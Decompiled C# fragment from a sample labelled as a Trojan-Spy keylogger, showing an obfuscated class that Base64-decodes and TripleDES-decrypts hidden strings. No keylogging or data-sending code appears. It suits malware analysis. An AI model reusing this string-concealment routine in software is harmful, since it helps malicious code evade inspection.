// Decompiled with JetBrains decompiler
// Type: .
// Assembly: d1a3l0s, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50A68CBD-55EA-4E40-8DCB-F2A44DFB42DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.aml-44c1ddfbe16f7426b43f0f84e1cff26f11ab5843bd621cd6766374fa6511763b.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0005
{
  internal sealed class \u0001
  {
    internal class \u0001
    {
      private TripleDESCryptoServiceProvider \u0001;
      private UTF8Encoding \u0001;
      private byte[] \u0001;
      private byte[] \u0002;

      public \u0001([In] byte[] obj0, [In] byte[] obj1)
      {
        this.\u0001 = new TripleDESCryptoServiceProvider();
        this.\u0001 = new UTF8Encoding();
        this.\u0001 = obj0;
        this.\u0002 = obj1;
      }

      public string \u0002([In] string obj0)
      {
        string str;
        try
        {
          str = this.\u0001.GetString(this.\u0002(Convert.FromBase64String(obj0), this.\u0001.CreateDecryptor(this.\u0001, this.\u0002)));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return str;
      }

      private byte[] \u0002([In] byte[] obj0, [In] ICryptoTransform obj1)
      {
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, obj1, CryptoStreamMode.Write);
        cryptoStream.Write(obj0, 0, obj0.Length);
        cryptoStream.FlushFinalBlock();
        memoryStream.Position = 0L;
        byte[] buffer = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
        memoryStream.Read(buffer, 0, buffer.Length);
        memoryStream.Close();
        cryptoStream.Close();
        return buffer;
      }
    }
  }
}
